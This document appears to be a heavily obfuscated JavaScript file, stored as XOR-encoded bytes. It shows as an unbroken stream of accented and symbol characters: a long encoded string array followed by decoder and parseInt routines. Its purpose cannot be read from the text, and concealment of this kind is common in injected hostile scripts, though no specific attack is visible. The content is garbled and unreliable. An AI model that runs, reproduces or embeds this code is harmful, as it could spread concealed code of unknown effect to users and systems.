ºæ±ªùòùé½çùòù¨³±ê½¸ëùòùèí½±²¯ùòùëº½³±µíùòùº³µñ´ùòù³±ëº³±½³µ¹³µñîùòùèí½±ëë½»¯ùòùë½±ñê³ïùòùæµìµ½µ§õõê¿ùòù¤³±ë¬³µªùòù³³µ«°¯ùòù¦±¬¿³µªªµê»±²ë¹ùòù¶¨îùòù³ïæê¨»¯ùòù¬±¶µõ½±èùòùèñºæ±éë§ùòù¯µ¤¬ùòùµ±êùòù³é´ùòù¸³ùòùºæµ©©¿¿ùòùªºæ±¤ùòùê½±¿ªµéºî¯¦ëùòùº½µ§°¶«ùòùæ´­µºõµ¤±õêùòùé²º³±­é¼ªæùòù¶º§ùòùêª½æ±º±³æ±¨ê®½¿ùòù­æ±ë½¶¬ªºùòùëñ½±õ¯æµïùòùº³±¸ùòù§³±´õùòù½æ±¨±ùòù½³µ¯¼º³µº¬¿ùòùªæ±³ë½©ùòù­±ë½ïëéº¼®ùòù½¼´çùòù¼³´»ùòù¶½¯ùòùéªº³±íè´¶ùòù»¨ª¯ùòù´³µºµùòù¿²¬³µ¸±¬¿êéºæ±²ùòù¿²¬³µ¯°¯§ùòùé½æ±½éé½ùòùæ´µºñ½©´³ùòùì¶ùòùíí½¿ùòùî½³±³§¿ùòù±­µ­ùòùë®½æ±§æµ¶ùòùèí½³±ë½»çëùòùµ´ùòù°½µï§ì½æµ°±ùòùé½æ±íëéº¿ùòù³±ìèºº±ùòù­³±©¼¼º½¿ùòù¨±¦¹¬í½ùòùéº±êë¤½ùòùï´­µºº¯ùòù©´èªº¸ºùòùê¼íë½ùòùææ«ùòù±çë²º±ùòùëº¯¦¯ùòù§¶ùòùæµ±©õµ¿µõéùòùí¨²«¦§ùòù¦«çéùòùê½æ±¦º±±±æ±ºùòùí½ùòù¸µ¬·µé«ùòù©æ±·êºæùòùéï®è½©ùòùé³¨ëùòù½·«µº®º­ùòù½æ±¨¬æ±¤¬±©æ±³ùòù³±æ¦ùòùèº½ææº½«ïùòùé½±ìùòùí½±½©î¶ºùòùèº¬²º±ùòù¶³±§§çæº²º¦º¯ùòù¤ï½¿ùòù³¦½æµ§ùòù®ì½±¶ùòù¶¯ùòù­èººùòùé½±µî¿ùòù´±²¼³±ùòùº½¼ëµïùòùëººº³±³ùòùºæ±¨ëíº¯ùòùíº³±®êë¦º¯ùòùæ§ìµº±µ§±õéùòù¿é½æµ»é»ì¦ùòùæµõµ¼±µ±õé¯ùòù­³±µ¿¬½¯ùòùë«êí½¿ùòù¯±ë½¨¼ùòùµµµïé¸¯ùòù³¿ñ½µ©¿ùòù§ëùòù¶«½µ±ê§ùòùæ²õµ½®½õ·ùòù½µ­µï¯ùòùíºæµè²¿¶»´¿ùòù¿³µì°±¯ùòù¤§©±¯ùòù¼§¼ùòùºæµæé¤¨ùòù³±¿»­º½¿ùòù½ªªº¼ùòùêé½±ªº±²ùòùæµíµº½íùòù³¼ï½¿ùòùé½¬°æêµ¤®º¿ùòù¬î§éñºùòùæ±ªêªº±ùòù¬æ±ë¦¼¬³µ¹æ±ùòù§©«½©î²½¯ùòùê¦½³±»®º¿ùòùº½ïùòù¯¶±¦¶º«íºùòùé½µº¼íéºµºùòù»æµéª½µº¸­¿ùòù«³µùòù¨¶«ëºùòùæµµ¼®½·ùòù¤±®è¦½©ùòù½æ±»§í§²º¨º¿ùòùèç½°ùòù³±ìêºæ±ùòù½­¶ºùòùí½¶ñºùòùºµéùòù±¦µ¸îº®«´ùòù®½ªº¿¯ùòù½½íºùòù´ìí½æ±¶êº¬»§³ùòù½µ½±¸ùòù±µ¨°µ¨«ùòù­æ±¹ê¦½¨ùòùé¤è½¸®½¦îùòùª±¿¿ùòùæ´µºõµ¤õêùòù®½¼¼¸îùòù¦æ±»ééº±ùòùª¦²½ùòùºæµéº¦ùòù½±ï©³±ùòù§³±éº¹îùòù½ºº¯ùòùê«ùòùæ±é¬µùòù§æ±ìéºêùòùé½±·¤¨»éº¦»¿ùòùæ§ì°õµ¿µ§±õéùòùæ±§§µ¿·ùòùæ´õëµ¼µ±õèùòùé¶½æ±³ùòù¼ïé½µé«ùòù±èéº§·ªµùòùí½¶ªººª½±¨ùòùë½±²ñºæ±µ´³±ë¶½ùòù½ªæ½ùòùêéé§ê¹ìêéé¤ùòùæ²õµ½±µ±õê¯ùòùæ§±±µ¿®¹½»ùòùèéºñº±æê¯±æùòùµæµéº½³µªùòùêº±èëùòù½­«ùòù½­¶º²½æµ©éùòùêéééî¿«¨«¿µèºê¿ùòù¦¶©ùòù²¦½µ¤¯ùòù¼®º±ì¯±°´³µùòù±ñèª½ùòùëº½²º³±ì¯ùòù´æµ±¨§»ùòù±¹è½»ùòù¬¨½ùòùéë¨é½íí½¶º©¦º¿ùòù²º±ùòùèê®»µ±îùòùî¿«ùòù·îé½µì­¦é½³µ¦±ùòùé¦½³±¦¼¼êª½¿ùòù®µï¿µé§ùòùæ´¨õµ½õµõêùòù¨±º¹½©íùòù¤±´êíºíêùòùº±îùòù«§½ùòùæ±õéªºîùòùéç¶¯ùòù±µ¦°æµæ¯ùòù¬±³µ¨»ùòù¦½»ªº­ùòù«ìçì¶¿ùòù©±ë·¨µ»ùòù·ºº±§ùòù½¯±¶§ùòùæ´ì¼õµ¿ñ½·ùòù®³µºµ®¬¿ùòù¸§¯¿ùòùé½æ±ê»ùòù½ñº¯ùòùè²½±º¨ùòùæ­§¬ùòùº±õæ¦ùòù¯æ±ïèºº±¹ùòù¬±ëµ¶ùòù«³¯ùòù·êë¿±í¶ºæµîùòù«±¯æùòùè½±ê¯æµùòùë°é½©¯ùòù´±º³±¯ùòù°¸¿µ§ùòù½«´³¯ùòù¼³µêèñ½µéùòù¸³µ¿µ®ùòùæµ¼±µ¼½éùòù©¤³µ¦³ùòùé½æµ¸©³ùòù¶°©ï«ùòù³µ¼·¦¯ùòùèº½³±ê½¯ùòùëñºµ°è·êñº©ê¬¹³µæµèùòù¯«ç´»æùòù®îë¿ùòù½µ¶º¿ùòù¹»¦½³µ¶éùòùæ²°õõëµ¼õµõéùòù³±æë®½§ùòù¸î¶½µçêùòù¹æµê³³µùòù¤õ¯±ùòùºîê½µíùòùº³µ«é¯ùòùæ§µõµ¼½¯ê³ùòùîê©í½¯ùòù¹«®¤¦ùòùº±½ùòù¸ª½³µ¸ùòù¦½³ùòùë²½±´¹¶æùòùê½±îèêùòù¦±¬¼æµ¤¬µî¼±´ë¹ùòùºµ¤é¸ºùòù¸¦ï¿ùòùµ¨ç¼ùòù¶®èºùòù¿³µ´µ«ùòù§³±õéªº¨¯§«¦µùòù«¸«è¶ºùòùéé½³±³æµùòù±µª¶³µëª¯ùòùê½³±îºæ±¼ùòùê®½³±±®¦§ùòùªº»ùòù½±ªº±§ùòù¨çùòù¦±¨ùòùè»»¨¸¯§êùòùí½±³±¯ùòùæ´ªõµ½¹¿·ùòù½ùòùè¦º¯ùòùºæµè¿¦ùòù¼¸½µ»é¯ùòùëºº­íº±ùòùé½±²íêùòù½º¸æ´¯ùòùè¤¿§¸³µéùòùµ·ê»ªùòùº½¦¶½æµë°æ¬³±¦¹¿¶½æµíùòù»±è­æ±«¬éº·ùòùæ§½ëµ½µ¤õè¯ùòù¤ïëùòù©æ±õéººì»ùòùè½æ±¶¦¨èªº«ùòùéº³µ»é´íùòùéºº±¬èï½ùòù·©³²º½êùòù¬±ë¦©©æµõµ±ùòù¬³±ê½¸ñº½ùòùë°ìªºùòùº§¼¯ùòù¯±ï³»´¬¨³µõùòù½ªñº¯½µºùòù²½µ¶¿ùòùæ§½µ¼®½è·ùòù¼æµñè½³µë°»¨³µçë«ùòù±ëº¶îùòù»«²½ùòù½±¯ª±§ùòùê´ë½í§ùòù©¤¨é½¿ùòù§¦»¸éº»³º««²¿ùòùæë½µî¼©íºµïùòùê½±¬ùòùê½±º¿ùòù»µ´è½µ¤ùòù§³±õèêùòù¤êº¼µ¯±»ùòù®½±¯±½ùòù«æ±º²º¦½ùòùº»»¯æùòù²º³±·ëºí¦ºùòùº»êéùòù¶µ¸æµ¸­µõ¿±«ë¬¿ùòù®±©±ùòù»º³±¯ùòù¿¸ñ½µìë»ùòùé½½®º¯ùòùºµ¨è¬­ùòùë®½±¯îîùòù±³µ·¶µ±­¿ùòù»²°ùòù½±é­ùòùæ§õµºñ½êæùòùê®½æ±ùòùéñ½³±®èí½ùòù¸îñ½µëë·ùòù¤±èé½¸ùòùè®½³±·îùòùêº½±®º¿ùòùæµõ¬µºµ±õêùòù®½¼ùòù³µª¼¯¿ùòùæ§±ªõµ¿±µõëùòùµ½µê«ùòù«µ¼¯ùòù·«ñ½³µ­¹®½³µ°¬æ±ùòùêº­¿¼¿ùòù²³±½¹³±¨î¯ñ½ùòùè´è½ìº½íºïùòùæ§½¸µ½µ¤õè¯ùòù³¬æ§êùòùæ²ì®µ½µõê¯ùòù³©ªæµ½±¯§è²½æµ°ùòùë½±­¼¼ë³ùòù½±æùòù¼ºæ«æíê·ùòù¶½±³±ùòù¦³±õë¶½¦ºæ±½¿ùòù¸æµ­¶³µªùòùæµ¿±µ¼¹¹ê¯ùòùé®½³µªùòùè·ë°î¼±ï¹©½µéùòù½ªº¯ùòù§¬§¨½±»ï»¿ùòù°µ§¹³µ»ùòù»³±ïªæ±´ùòù½ª³ùòù¨³±ñêª½ïêùòù«³µï¹ùòùè¶½³±¿ê®º«ùòù¦¨´¿ª¶îùòùëººº±ì³¨±®¸¿ùòùñ½¼¬³µëùòù¦¬§½¸ùòù»¹®½±¶èêùòù±æµªé®½æµ§ùòùñ½¿¨­ùòùæ§±§±µ¿±µ±õëùòùé±é¦½¯ùòùêõ¦º³µªæ±¸é½±éùòùæ§¨í½±¶°¸¿ùòùê¿ïñ½±®¹»´¯ùòùñ½±¿·½ùòù´íªùòùºæ±»ùòù»ì½µ¯¬ùòù¿µè¶½µêùòù¨æ±¶¶¯æµ­¸³±ùòù±©êíº±ùòùªæ±«¿¬¯ùòùëª½±½¶æùòùê¨²»±¿îïê®½æµ»èëîùòùïª¦êùòù½ºë¶îùòù©îµèº¹ï¸ùòù¯±æê½¿ùòù®æµ·µæµùòù½íº³±ªùòùê®½±·¬¹ùòù¿æ±©±®¯ùòù±ë«µ¹«»°°¿ùòùí½±­³±±ùòùñºµ«ë­ùòù±æ±½¯ùòùæ§­»µ½µõë¿ùòùæµ±¶õµ½µõõé¿ùòù¨æ±ê½¹éñºº¼ùòùº½µ¦¹ºµ³¬¼ùòù½±°§æ±ùòù«æ±¦ê·ùòù«³±è½íùòùé½µ»«³ùòù±ïùòùè²º±ùòù¦±í®ª½¯ùòù³ªº³±µ¯¿ùòù¯¯µ¼¿ùòùæ§­«õµ¿±µõë¯ùòù¶îñ½±èêùòùæµ±µ¿µõõéùòù§æ±êùòùê­´ê­ê­ê©ªê­¼êê­¨ê«§ùòùæµ­õéùòù±îééº¿ùòùê½±ºùòù¨æ±êë»ùòùè¶½³±æè³ùòù³ï¦½µì©¦¦½µ¸¦³±ùòù­±º¼¬½¹§²·ùòù´«ñ½³µìñ½³µ¿ùòù½¼º¿«ùòùê½æ±õùòùº½µ®¤¯ùòù³«¯­¨¯ùòùé½æµ­¶©íº³µ¨¿ùòùë¶ºº±¨ùòùèº½±çè·èº±ì³æµùòù©µîùòùê¤²©ùòùëñ½³µùòùª½æ±ñ±ùòùèî­¸¯ùòù¬µëªùòù³ì½±èîùòùêºæ±¯èùòù·¶½±¹ê²ºùòùé²½±²¯µëùòùº½±¤ùòùæ±æ¿ùòù¸¯º³±¬¯ùòùº¨½æµê»ùòùé¦½±¹¦´ùòùè¨¶ç³ê¿ùòùª½°¬½±è³ùòùé½±ùòù´æµ¤·¶µ¹­ùòù¯õæµ­¼ùòù¸¯³­êëæùòùî§¸èº¿ùòù¸ñº±¯ùòù«µ¶¹¦ùòù«²«æµ¤²ùòùèñº³±ê¤¦ùòùºµêõùòù´ëçç³¿ùòùæ§éº«§«¹ùòùèí½³±ë½ùòùº³µèé¼ùòù³ìí½µ­©¿ùòùæ´õµ½¹¿«ùòùæ´õµºõµ¤±õêùòù¿µé²½µùòùë½æ±ñ¯ùòùè½±º¿ùòù©±ë«¿§«ùòù©«¬±ï·ùòùæ©±ùòù¹¸»§¤«¯ùòùºî¸«ùòù¶«éñºùòùè´è½ìº½íºïºùòùï¬°íºïºùòù±éºº³±°ùòù³±èêéºæ±¿µª¿ùòù¦±õèº¿ùòùºæ±´¯çªºìºùòù¤¬¶ùòùïî«æùòù·­¤¦®½¯ùòù¦½µì±«¿ùòù¦½¯´ºùòùè½³±è½»¬¬µæ±ºë§ùòù¦æ±­êº»ùòù³±èèº¦¿ùòù½µµùòù¼·èë¼»ùòùè®½æ±í¦¯±ªºêùòù²½¯ë¤´ùòùë­µùòù·³µ²§±ùòù½º¬½±ùòùí½¶º½±º³æ±»ùòù³è¤µ¶»¯ùòù«³±î¹ª½¯ùòù¿µëèñ½µêùòù®º³±ê¶º«ººùòù±çê½¦ùòù¶®º±ªùòù²µ²ùòù±ñêºí·ùòùª¨¿¯ùòùº³±î¿ùòù¦æ±ëº±ìùòù¨±·ç¨µêº±ùòùõ¨ì¶½¿ùòùé½±»é³ùòùæ²­µ¼µ¤õêùòù³ªæµ¸ùòù®º³µ½ê¸ùòù¤í¿§èº«ùòù»ë¬¸ùòù§±ê®½îùòù½æ±±§³±¼ùòù¤±éñºùòùºº±ªùòù³ª¶ºæ±ª¿ùòùæ§µ»µ¼µ¤õë¿ùòù¼±»³±º¿ùòù±êº±·ùòù¼½µ¯é«¦ïºùòù·ª»æñùòùª½µ§¼¦¯ùòù±ê®ºæ±ºµ¨ùòùé®ºæ±³è¦ùòùê©¦ê³êê»ê­ñê­²êéêê©»ê­èùòùê½±½«ùòùëé½±ªº±»æ±²ëñ½ùòùº»·ì½æµùòù±êñº³±ùòù¦±·ê³ùòùè½³±¦ùòù°µ°¼ùòùæ§½õõèõµ¿õµõê¯ùòù°¬¬°í¿ªº«ªº¿ùòù¿µ¸³µ­µè¿¯ùòùº³µ¯è¶ùòùæµ±µ¿µ§õõéùòùë¨¸¹¨ùòù§µ¹¬§ùòù¿¿îùòù«µîùòù³ª½µùòùé½æµ¹³ùòùñº³µê°ùòù½ç¶¿ùòùéºµ¼éùòù±îé®ºùòùº¹½µ§éùòùº«·ùòùê¦º­º³±«ùòù¨æ±¯ùòù¯³«½¨¯®ñ½¿ùòùº½æ±ñ§æ±ùòùí½µµ©¿ùòù»­éº±ùòù©¶¨§¶«ùòùèº¿îîùòù¼î½æµ¿êùòùê½³±¯æµ±ùòù½´´ºùòù½±¿ùòùèº±«èùòù½í®º³±«æ±³ë±µñùòù¯¸êñº¯ùòùª¸¯éèñºùòù½±«ì®ºìºùòù¹¹½µ¤ùòù±õéõµ¿¯ùòùéª½æ±ê½ì¿ùòù½±¬æ±»¨±ùòùë½æ±¨íº¿ùòù±µêñº¹ùòùæ´µºñ½©§ùòùºæèº¶½µùòù½æ±ï«±ùòù»ëïí»±ï®ùòù±éí½«ùòù¿²­³µ¿®¯ïùòù©µ²½µ¬µì»æ±´ë¿ùòùé²¤æùòù«¬»µ¿ùòùº¸³æ¤ùòù½¯ùòù´³ùòù©±«¼²½ùòù¯æ±»½·ùòù½¿ùòùªæµ¦¯ùòù½æ±¹µ½ºì¯¦ëùòùëººùòù±¬æµ¿ùòù¦ºµëèëùòù®±ùòùñ°¹ªº½º½ùòùæ´ì¿õµ¼½èùòùëë½«¬ùòùæ±ç³ùòùê¶½³±¿«ùòù¿³±«±¤¼º»³ëùòùëé½±º±ë¤¿ùòù¯é¤æµ­ºùòù±²í½¿ùòù­±èñ½¶ºæ±ùòù¯±¼²ùòùìæêêíºùòùæ§ëùòù­º¬¯ùòùµæµê·³µªùòùº³±õæ­ùòù¨±º¸¨§³µ¬ùòù´¼º±¯¿ùòùæ´ªõµ½¹¿¯ùòù¬æ±ë¦°ùòùæ¤éíº¿ùòùë²½±§­¿ùòùªº³±§¿ùòùê½±¦³µ²ºëùòùéï®é¦½¦ºº»¶ºùòù»¿»¿ùòùµ¦º½±¶ëªºæ¯¿ùòùº«¿¼ùòùµ³±ì«îùòù©µê­æùòùæµ±¨µ¿½ùòù±èªºæ±æùòùê½±ª³µùòù­±º¿½¿ùòù½íº¿½³±«´¯ùòù¿©½æ±¤é¨¶»ùòù«í¸º¦¹·ùòù¼±«ñ¯ùòù·±¯³æùòù®æµîë¶½µæùòù¿æµé»µª¬µ¸ùòùêºíº³±ìùòù®³±ñæçùòùñº³µñé³ùòùºº¶¯±§ùòù²îñ½µ¦í¦½µ®¨ùòùé½±´è§­ùòùµ¬¸¦¨±ñ¿ùòù»¶¦½æµµ©¿ùòù·ì¤¨º½ººùòùê½³±ïñºùòù½¶ºùòù¸©½µè¿ùòù½­²ºº¯ùòù¯ªùòùº½æµ²°í§ùòù¿°èæ²¯ùòù½æµ¬¸ùòùé®º³±®éªùòù±¦½æµ¤éæ¨¯ùòù´î³­¤¿ùòùæ´õèµ¼µ±õèùòù¹µë½æµùòùé¤éº½¨¶½íº¹º¿ùòù©±ùòùéé½³±èêº½»³ùòùëª½æ±±¹§ùòùé¨é²½ïé½îº«ªº¿ùòù´ï½æµ¸éùòùí½ºæùòùè½±µ§ùòùµª¦ºùòù®µ´è¦½µîùòù²½ºæùòùë¸íé¶º§ùòùë½±°æµùòùª±®º¼½î»í°½¦½ùòùëùòù¹¹ª½æµé³ùòùèíºº³±­ùòùí½ïº³ùòùº³µ¨è¬ùòù¯±îê½îêº½¤ùòù©±íê²º©ùòù±ùòù«±´êºï·ùòùæ²õ¨µ½±µ±õê¯ùòù¨µ¨®¯ùòùè¶ºçùòùèº½±ùòù±èº±ñ¹³µ¹æµùòù¸¶¦½îùòù¿¯»¯ùòùè´é½¨í½ííºïº¿ùòùæ§µìõõë±µ¿±µ§õèùòùæ§íµ¿±µ§±õë¯ùòùªº±ï¹º®º±¼µëùòù³µ°²±³µ¶¬¦½±¬ùòù½µ©é²½µ®ùòù³±ñ¬æµ¨æ·®§¯³ùòù½¹¶º¨é½±º´³±®ùòù¸§´¯ºùòù¿³µ©´î®¯ùòùé®º³±±èêº¹§ùòù³±¯³µ»ê¸µ¯ùòù¶¹®½¿¦½º¿ùòù½³±§æ±ùòù¤¿¦êíº¨ººùòùë²½æ±¤¹ùòùª³±¶¿½ùòù¤æ±îëºê¦µùòùë¶½±ëêëùòùæé¬ºùòùè±²©²ùòùêñ½±¼ë³­ùòù¤¼·ë±­§ùòù¯³µê¸©¯¿ùòù¿µ¼µ¨¦æµ½æ±´¯ùòù¿æµë½³µ¤ùòù´³µ¼µê¿ùòù²½±°æ±¯ùòù¸¿ùòùèº½æ±¨ë½ùòùº½º¸ë¹ùòùêººæ±¸ëïùòù¤º··²º»ùòùéª½±©ë¤ùòù¯æ±é½¸³ùòù¿µé®½µ¤è­¿ùòùºæµ½±ëéºí«ºëùòùé¦ºªç½©¸ç¼ùòùéï¸è¦½¸¯ùòù½ìùòùê¦éº½¦ùòù¸ìñ½µº¯ùòù¹¶½³±¦è«ùòù¶±©æ±«¸ª®ºîêùòù´í¦°ªª½«í¼ùòù»¿¦êùòùµ±´±æ±¤¿²¿½º³ùòù½«ïùòù¬±ñè½»ªº±½±ùòùê¶ùòùè¦½±ê·é¶ºï§¬ùòùêí½±°«µùòù¶º³±··¦êº»·ùòù¶±§æ±¯ùòù°«©¬¦ùòù±¹½±¸ê²º¬»§³ùòùªº»îíùòùéº±¸ê¸¶ùòù®½¿ï²¯ùòùéª½³±«º©¬è½º¯ùòùæ§­õµ¼µõë¯ùòùºæµùòù¿æ±ïª±´ºîëùòùí½±¦êñ½¿ùòù§³±ëºæ±º³µ½ùòùæ§íµ¿®½îùòù¯ë¼æ´±ï¹îùåã¸«°½ª·±°ö÷¥¬»ª«¬°þ³å£å¬»ª«¬°þö÷å£½±°­ªþ¿ãåö¸«°½ª·±°ö³ò÷¥½±°­ªþ½ãòã³ö÷å©¶·²»öÿÿ÷¥ª¬§¥½±°­ªþãó®¿¬­»°ªö½öî¦ëî½òùêïù÷÷ñöî¦¿ôóî¦ìæíõóî¦½í¸ôî¦íõî¦íºº½÷ôö®¿¬­»°ªö½öî¦êº¸òù¶ªëù÷÷ñöóî¦ïìæ¸ôóî¦ìõóî¦êè»õóî¦ìî¿»÷÷õ®¿¬­»°ªö½öî¦ì¼èòù°ù÷÷ñöóî¦êôî¦ëìéõî¦ïôî¦ìîê»õóî¦¼¿¸÷õ®¿¬­»°ªö½öî¦ëêçòùç®ù÷÷ñöî¦êôóî¦èëèõóî¦íºôóî¦»õî¦¼îíôî¦ì÷ôöó®¿¬­»°ªö½öî¦ìæèòù°ù÷÷ñöóî¦ï½í¿õóî¦ïéôóî¦ïîïõóî¦ïæôóî¦íé÷÷õó®¿¬­»°ªö½öî¦ë¿ºòùºëèù÷÷ñöóî¦ìèìçôóî¦ïõî¦ì¸»ôî¦ºõóî¦êºîç÷ôö®¿¬­»°ªö½öî¦í½»òùµ³ïù÷÷ñöóî¦ïôî¦êïïõóî¦ìî»éõî¦ìê¸¸÷÷õó®¿¬­»°ªö½öî¦ê»èòùç®ù÷÷ñöî¦ïèíçôî¦ïõî¦ïôî¦ïêêëõóî¦ì¿éè÷ôöó®¿¬­»°ªö½öî¦¸»òùî½ù÷÷ñöî¦ïôóî¦ïç¿çõóî¦ïïìôî¦ìíõî¦ì¸ôî¦ïëæ÷÷õ®¿¬­»°ªö½öî¦ë¸ìòù¦µù÷÷ñöóî¦ïºèëõóî¦ïçïëõî¦íèæê÷õó®¿¬­»°ªö½öî¦é½çòùê©¯ù÷÷ñöóî¦º½½õî¦ïôî¦ïæºèõóî¦ëôî¦ìíí÷å·¸öããã÷¼¬»¿µå»²­»þù®«­¶ùöù­¶·¸ªùö÷÷å£½¿ª½¶ö÷¥ù®«­¶ùöù­¶·¸ªùö÷÷å£££öòóî¦ïêºïôî¦ïéõóî¦í¿¼¸éõî¦çî¸¸í÷÷å½±°­ªþ®¿ª¶ã¬»¯«·¬»ö¿öî¦èï½òù°ù÷÷ò¸­ã¬»¯«·¬»öù¸­ù÷ò¥»¦»½£ã¬»¯«·¬»ö¿öî¦èïºòùìù÷õ¿öî¦ï½æòù°ç¬ù÷÷ò½±°¸·¹ã¬»¯«·¬»ö¿öî¦ìê½òùî³íù÷÷òº»¸¿«²ª­ã¬»¯«·¬»ö¿öî¦èëèòùî½ù÷÷ò²±¹¹»¬ã¬»¯«·¬»ö¿öî¦æèïòù°ù÷õù»¬ù÷ò¥­¿¨»»­­¿¹»ò­¿¨»·»©°½»£ã¬»¯«·¬»ö¿öî¦èîêòù°ù÷õ¿öî¦é¿ëòù§ç¶ù÷÷ò¥¶¿°º²»¬±«®¨»°ª­£ã¬»¯«·¬»ö¿öî¦êïèòù¨§ù÷õ¿öî¦æ½ëòùî½ù÷÷ò¥¶¿°º²»«ª±¿¨»ª¿ª«­£ã¬»¯«·¬»ö¿öî¦çìèòùæù÷õ¿öî¦ç»ïòù¬ù÷÷ò¥´·º±«³£ã¬»¯«·¬»ö¿öî¦ë½ïòù¸èù÷õù­ù÷ò¥³¿ª½¶«º±ò¿ºº«º±²·¿­ò³¿ª½¶«º±ò³¿ª½¶«º±ò³¿ª½¶¿°°»ºò¿ºº¿°²·¿­ò¹»ª¿°°»º·­ªò³¿ª½¶¿°ò³¿ª½¶¿°£ã¬»¯«·¬»ö¿öî¦íæ¸òùç®ù÷õ¿öî¦ì»¸òù«®³ù÷÷ò¥»°¸±¬½»ä»°¸±¬½»·°µ£ã¬»¯«·¬»ö¿öî¦éêëòùî½ù÷õ¿öî¦ì¸íòù¸èù÷÷ò¥»°¸±¬½»ä»°¸±¬½»ª·½µ»¬£ã¬»¯«·¬»ö¿öî¦íºëòù¤û»ù÷õ¿öî¦êêéòù°ù÷õù»¬ù÷ò¥»°¸±¬½»ä»°¸±¬½»»º·¿£ã¬»¯«·¬»ö¿öî¦íºëòù¤û»ù÷õ¿öî¦êíïòù¸èù÷÷ò¥»°¸±¬½»ä»°¸±¬½»¿º©±¬º£ã¬»¯«·¬»ö¿öî¦íºëòù¤û»ù÷õ¿öî¦ïºíòù±ëù÷õù¬ºù÷ò¥»°¸±¬½»¿¬ºä»°¸±¬½»¬±«®»°ª·±°¿¬º£ã¬»¯«·¬»ö¿öî¦èìîòù­¤ù÷õ¿öî¦íïëòù«®³ù÷õ¿öî¦íîëòùë¼ù÷÷ò¥·­½ª·¨»ä·­±«°ª»¬½ª·¨»ò·°½¬»³»°ª±«°ªò®¿«­»°º²»¿¬£ã¬»¯«·¬»ö¿öî¦ïéèòù°ç¬ù÷õ¿öî¦ëë¿òù­¤ù÷÷òã®¿ª¶¿öî¦ç¿íòù½«ù÷öº·¬°¿³»ò¿öî¦æç¿òù°ù÷ò¿öî¦çèîòùêïù÷õ¿öî¦ì¿îòù·êù÷÷ò¹»ª¹°±¬»·­ªãö÷ãà¥½±°­ªþã¿ò³ã¥ù¶±¿¦ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù§²±ùä¸«°½ª·±°öò÷¥¬»ª«¬°þøøå£òù©¦©¯ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù±§»ùäöî¦ïèæòùé´ù÷òù¸¨ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù·»·ùäöî¦íëíòù÷¬û½ù÷òù´º¯ùäöî¦è¼êòùôëù÷òùùäöî¦æ¿éòùÿéù÷òù°¶®ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù¬ùäöî¦ê¿¸òùì±ù÷òù§¬¸ùäöî¦íì»òùë¼ù÷£åª¬§¥·¸ö³öî¦èïìòù³ù÷ö³öî¦íîíòù°ù÷ò³öî¦èíîòù°ù÷÷÷¥·¸öÿøøù·ºù÷°ã³öî¦ïì¸òù«¹¤ù÷ö¤òù·ºù÷å½ã¿öî¦íæ¼òùî½ù÷¢¢öî¦ëí½òùêïù÷¢¢°«²²å·¸ö³öî¦è¿êòù¸é¶ù÷ö´òº÷÷³öî¦ççîòùîù÷öòò¦÷å£»²­»¥·¸öÿ¸­öî¦æ»¸òùì±ù÷ö÷÷¬»ª«¬°å¬»ª«¬°þöî¦ïí¸òù²êöêù÷ö¸­öî¦ë¸íòùî½ù÷õù°½ùöò³öî¦íççòù¦±ù÷÷÷å££½¿ª½¶ö÷¥·¸ö³öî¦íéìòù°ç¬ù÷ö³öî¦ìç¼òùî½ù÷ò³öî¦æèèòù«¹¤ù÷÷÷¬»ª«¬°å»²­»¥½±°­ªþãöî¦ê¸èòù­¦êù÷å·¸öÿ÷¬»ª«¬°þ³öî¦ìºçòù±ëù÷å¬»ª«¬°þöî¦èé½òù°ù÷ö÷óî¦ì¿ºôóî¦¼õî¦ïéîïõóî¦íêéî¢¢³öî¦ï¸íòù­¤ù÷å£££ò½±±²º±©°­ã°»©þ¿®ö÷òãî¦éíôî¦ïíõóî¦ïïîìõî¦ï½îïå­»ª°ª»¬¨¿²öö÷ãà¥½±°­ªþ´ã¿òã¥£å´öî¦çëçòù²êöêù÷ã¸«°½ª·±°öò÷¥¬»ª«¬°þàå£ò´öî¦é¼îòù®ù÷ã¸«°½ª·±°öò÷¥¬»ª«¬°þóå£ò´öî¦çç»òùî³íù÷ã¸«°½ª·±°öò÷¥¬»ª«¬°þôå£å½±°­ªþãòã¿ª»´öî¦ì¸»òùìù÷ö÷å¸±¬ö½±°­ªþò±¸þ½±±²º±©°­´öî¦ê¼çòùôëù÷ö÷÷¥·¸ö´öî¦ê½ëòù³ù÷ö´öî¦éì½òùê©¯ù÷öò÷ò´öî¦ëéìòù¶ªëù÷öòóî¦ïïéæõî¦¿çïõî¦è¸ï÷÷÷½±±²º±©°­´öî¦ê¿îòùôûù÷ö÷å££òöóî¦íæíôî¦¼õóî¦ïôî¦ïçïëõî¦½½¿ôî¦ë÷ôöî¦ï¿ëôóî¦ïíõóî¦¸¼ïõóî¦ïôóî¦ì¸ì½÷ôöóî¦ïôî¦ï¿¸éõóî¦í½ôî¦ì½õî¦ìçì¸÷÷å¸«°½ª·±°þö³ò÷¥³ã³óöóî¦êôî¦éèêõî¦ëìæôóî¦ìõî¦ìæçí÷å½±°­ªþãö÷å²»ªþã³å·¸öù¬ùããã«°º»¸·°»º÷¥¨¿¬þã¸«°½ª·±°ö¯÷¥½±°­ªþãù¿¼½º»¸¹¶·´µ²³°±®¯¬­ª«¨©¦§¤îïìíêëèéæçõñãùå²»ªþ¸ãùùò¶ãùùå¸±¬ö²»ªþãî¦¼»ºõóî¦ïôî¦çæîõóî¦ìèºòò°ò¤ãî¦ïëôóî¦ï½ïõî¦ï»»íõî¦ë¸ìå°ã¯ù½¶¿¬ªùö¤õõ÷å °øøöãûöóî¦ïíëôî¦ìîõî¦ìííîõî¦íéê÷áôöóî¦¿íîõóî¦ïíôî¦ìëõî¦ºì¸÷õ°ä°òõõûöóî¦ì»æõî¦ìèîëõî¦ëôóî¦éîë÷÷á¸õãª¬·°¹ù¸¬±³¶¿¬±º»ùöî¦ëôî¦ºçõóî¦ìëôî¦½éõî¦ïçæëøààöóöóî¦æôóî¦ï¼¼õî¦¼èôóî¦ï¸õî¦æíê÷ôøóî¦éì¼õóî¦ïîêïõî¦ïôî¦ïééì÷÷äî¦¼ôóî¦ææõóî¦ï¼êèõî¦çºôî¦íè÷¥°ãù·°º»¦¸ùö°÷å£¸±¬ö²»ªþãî¦ìèê¼õî¦íôî¦½ëíõóî¦ê¼êêò½ã¸ù²»°¹ª¶ùåâ½åõõ÷¥¶õãùûùõöùîîùõ¸ù½¶¿¬±º»ªùö÷